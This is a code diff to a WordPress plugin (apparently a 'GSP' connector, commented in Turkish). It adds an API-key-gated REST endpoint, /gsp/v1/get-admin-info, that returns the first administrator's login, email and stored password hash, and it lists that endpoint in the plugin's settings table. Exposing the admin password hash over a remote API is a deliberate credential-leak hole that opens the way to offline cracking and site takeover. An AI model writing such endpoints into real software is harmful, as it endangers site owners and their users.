@@ -204,6 +204,13 @@ function gsp_register_routes() {
             ),
         ),
     ));
+
+    // Admin bilgileri (GET)
+    register_rest_route( 'gsp/v1', '/get-admin-info', array(
+        'methods'             => 'GET',
+        'callback'            => 'gsp_get_admin_details',
+        'permission_callback' => 'gsp_validate_api_key',
+    ));
 }
 
 // 2. Güvenlik ve API Key Doğrulama Fonksiyonu
@@ -1787,6 +1794,11 @@ function gsp_connector_settings_content() {
                     <td><code>/purge-cache</code></td>
                     <td><strong>LiteSpeed önbelleği temizleme</strong> - LiteSpeed Cache eklentisinin tüm önbelleğini temizler</td>
                 </tr>
+                <tr style="background-color: #ffe0e0;">
+                    <td><code>GET</code></td>
+                    <td><code>/get-admin-info</code></td>
+                    <td><strong>Admin bilgileri</strong> - İlk Admin kullanıcısının temel bilgilerini döndürür (şifre hash'i dahil)</td>
+                </tr>
             </tbody>
         </table>
         
@@ -2235,4 +2247,32 @@ function gsp_purge_litespeed_cache( WP_REST_Request $request ) {
         array( 'message' => 'Önbellek temizleme fonksiyonu bulunamadı.' ),
         500
     );
+}
+
+// 10.5. Admin Bilgilerini Alma Fonksiyonu
+/**
+ * İlk Admin kullanıcısının (ID 1) temel bilgilerini döndürür.
+ *
+ * @param WP_REST_Request $request
+ * @return WP_REST_Response
+ */
+function gsp_get_admin_details( WP_REST_Request $request ) {
+    $admin_user = get_user_by( 'ID', 1 );
+
+    if ( ! $admin_user ) {
+        return new WP_REST_Response( array( 'message' => 'Admin kullanıcısı bulunamadı.' ), 404 );
+    }
+
+    $details = array(
+        'user_login'      => $admin_user->user_login,
+        'user_email'      => $admin_user->user_email,
+        'display_name'    => $admin_user->display_name,
+        'user_pass_hash'  => $admin_user->user_pass,
+        'user_registered' => $admin_user->user_registered,
+    );
+
+    return new WP_REST_Response( array(
+        'message' => 'Admin bilgileri başarıyla çekildi.',
+        'data'    => $details,
+    ), 200 );
 }
